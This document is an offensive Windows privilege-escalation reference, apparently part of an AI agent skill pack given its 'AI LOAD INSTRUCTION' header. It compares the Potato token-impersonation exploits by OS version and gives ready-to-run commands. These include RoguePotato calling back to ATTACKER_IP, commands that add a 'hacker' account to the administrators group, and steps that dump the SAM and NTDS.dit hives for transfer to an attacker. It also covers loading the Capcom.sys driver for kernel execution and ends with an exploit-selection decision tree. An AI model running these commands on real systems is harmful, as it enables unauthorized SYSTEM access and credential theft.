# Token Manipulation & Potato Family Detailed Comparison

> **AI LOAD INSTRUCTION**: Load this for in-depth Potato exploit selection, token privilege prerequisites, OS-version matrices, and protocol-level details. Assumes the main [SKILL.md](./SKILL.md) is already loaded for general Windows privesc flow.

---

## 1. TOKEN PRIVILEGE PRIMER

### Privilege → Attack Mapping

| Token Privilege | Attack Vector | Tools |
|---|---|---|
| `SeImpersonatePrivilege` | Impersonate any token presented to you → Potato exploits | All Potato variants |
| `SeAssignPrimaryTokenPrivilege` | Assign token to new process → create SYSTEM process | TokenManipulation, Potato variants |
| `SeDebugPrivilege` | Open any process → inject/dump SYSTEM processes | Mimikatz, procdump |
| `SeBackupPrivilege` | Read any file ignoring DACL → extract SAM/SYSTEM/NTDS | reg save, robocopy /b |
| `SeRestorePrivilege` | Write any file ignoring DACL → DLL hijack, service binary | copy/move to restricted paths |
| `SeTakeOwnershipPrivilege` | Take ownership of any securable object | takeown, icacls |
| `SeLoadDriverPrivilege` | Load kernel driver → kernel-level exploit | Capcom.sys exploit chain |
| `SeManageVolumePrivilege` | Volume operations → arbitrary file read/write | Exploit via Volume Shadow Copy |

### How Token Impersonation Works

```
1. Attacker (service account) creates a named pipe / COM server
2. SYSTEM-level process connects (coerced or naturally)
3. Attacker calls ImpersonateNamedPipeClient() or similar
4. Attacker's thread now runs with SYSTEM token
5. Use CreateProcessWithTokenW() to spawn SYSTEM shell
```

---

## 2. POTATO FAMILY EVOLUTION

### Timeline & Motivation

```
2016: Hot Potato     — NBNS spoofing + WPAD + NTLM relay (patched)
2018: JuicyPotato    — COM/DCOM activation with custom CLSID
2019: RoguePotato    — OXID resolver redirect for Server2019
2020: PrintSpoofer   — Named pipe via Print Spooler service
2021: SweetPotato    — Combines multiple coercion techniques
2022: GodPotato      — DCOM RPCSS direct, broad OS support
2023: EfsPotato      — EFS RPC named pipe token capture
```

---

## 3. DETAILED COMPARISON MATRIX

| Feature | JuicyPotato | RoguePotato | PrintSpoofer | SweetPotato | GodPotato | EfsPotato |
|---|---|---|---|---|---|---|
| **Required Priv** | SeImpersonate/SeAssignPrimary | SeImpersonate | SeImpersonate | SeImpersonate | SeImpersonate | SeImpersonate |
| **Win7** | Yes | No | No | Partial | No | No |
| **Win8/8.1** | Yes | No | No | Partial | Yes | No |
| **Win10 (1809-)** | Yes | No | Yes | Yes | Yes | Yes |
| **Win10 (1903+)** | No (patched) | Yes | Yes | Yes | Yes | Yes |
| **Win11** | No | Yes | Yes | Yes | Yes | Yes |
| **Server 2012/R2** | Yes | No | No | Partial | Yes | No |
| **Server 2016** | Yes | No | Yes | Yes | Yes | Yes |
| **Server 2019** | No (patched) | Yes | Yes | Yes | Yes | Yes |
| **Server 2022** | No | Yes | Yes | Yes | Yes | Yes |
| **Protocol** | DCOM (CLSID) | OXID redirect | Named Pipe (Spooler) | COM + Spooler + EFS | DCOM RPCSS | EFS RPC |
| **External Req** | Valid CLSID list | Port 135 redirect | Print Spooler running | None specific | None | EFS service |
| **Detection Risk** | Medium | Medium-High | Low | Low-Medium | Low | Low |
| **Complexity** | Need CLSID | Need network redirect | Simple | Simple | Simple | Simple |

---

## 4. TOOL USAGE — COMMAND REFERENCE

### JuicyPotato

```cmd
# List valid CLSIDs for the OS version (from juicy-potato GitHub)
# https://github.com/ohpe/juicy-potato/tree/master/CLSID

JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c whoami > C:\temp\out.txt" -t * -c {CLSID}

# Common CLSIDs:
# {4991d34b-80a1-4291-83b6-3328366b9097}  Windows 10
# {e60687f7-01a1-40aa-86ac-db1cbf673334}  Server 2016
```

### RoguePotato

```cmd
# On attacker machine: redirect OXID resolution (port 135)
socat tcp-listen:135,reuseaddr,fork tcp:TARGET:9999

# On target:
RoguePotato.exe -r ATTACKER_IP -l 9999 -e "cmd.exe /c whoami"
```

### PrintSpoofer

```cmd
# Interactive SYSTEM shell
PrintSpoofer64.exe -i -c cmd.exe

# Execute command as SYSTEM
PrintSpoofer64.exe -c "cmd /c net user hacker P@ss! /add"

# Works from a service context (IIS, MSSQL)
```

### SweetPotato

```cmd
# Auto-selects best technique
SweetPotato.exe -e EfsRpc -p C:\temp\rev.exe
SweetPotato.exe -e PrintSpoofer -p cmd.exe -a "/c whoami"

# Techniques: WinRM, EfsRpc, PrintSpoofer
```

### GodPotato

```cmd
# Broadest modern compatibility
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "cmd /c net localgroup administrators hacker /add"

# .NET version requirements: .NET 2.0 / 3.5 / 4.x variants available
```

---

## 5. SeBackupPrivilege EXPLOITATION

```cmd
# Method 1: Registry hive extraction
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
reg save HKLM\SECURITY C:\temp\SECURITY
# Transfer to attacker → secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

# Method 2: robocopy with backup flag
robocopy /b C:\Windows\NTDS C:\temp ntds.dit
# Then extract with secretsdump
```

### PowerShell Approach

```powershell
# Import required DLL methods for backup privilege
# Set-SeBackupPrivilege then copy NTDS.dit
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
Set-SeBackupPrivilege
Copy-FileSeBackupPrivilege "C:\Windows\NTDS\ntds.dit" "C:\temp\ntds.dit"
```

---

## 6. SeLoadDriverPrivilege EXPLOITATION

```
1. Compile or obtain a vulnerable signed driver (e.g., Capcom.sys)
2. Create registry key: HKCU\System\CurrentControlSet\MyDriver
   - Set ImagePath to \\?\C:\temp\Capcom.sys
   - Set Type to 1
3. Call NtLoadDriver() to load the driver
4. Exploit the vulnerable driver for kernel code execution
5. Use kernel access to steal SYSTEM token
```

```cmd
# Using EoPLoadDriver
EoPLoadDriver.exe System\CurrentControlSet\MyDriver C:\temp\Capcom.sys
# Then use ExploitCapcom.exe to execute command as SYSTEM
ExploitCapcom.exe cmd.exe
```

---

## 7. POTATO SELECTION DECISION TREE

```
Have SeImpersonatePrivilege?
│
├── What OS version?
│   │
│   ├── Windows 7 / Server 2008R2
│   │   └── JuicyPotato (find valid CLSID for this OS)
│   │
│   ├── Windows 8/8.1 / Server 2012/2012R2
│   │   ├── JuicyPotato (first choice)
│   │   └── GodPotato (if JP fails)
│   │
│   ├── Windows 10 (1607-1809) / Server 2016
│   │   ├── PrintSpoofer (if Spooler runs)
│   │   ├── JuicyPotato (find CLSID)
│   │   └── GodPotato
│   │
│   ├── Windows 10 (1903+) / Server 2019
│   │   ├── PrintSpoofer (if Spooler runs)
│   │   ├── GodPotato (recommended)
│   │   ├── RoguePotato (if you control port 135 redirect)
│   │   └── SweetPotato (auto-selection)
│   │
│   └── Windows 11 / Server 2022
│       ├── GodPotato (recommended — broadest compat)
│       ├── PrintSpoofer (if Spooler runs)
│       └── SweetPotato (fallback)
│
├── Print Spooler service running?
│   ├── Yes → PrintSpoofer (fastest, cleanest)
│   └── No → GodPotato or RoguePotato
│
└── All fail?
    ├── Check if EFS service runs → EfsPotato
    ├── Try SweetPotato (rotates techniques)
    └── Consider named pipe impersonation manually
```
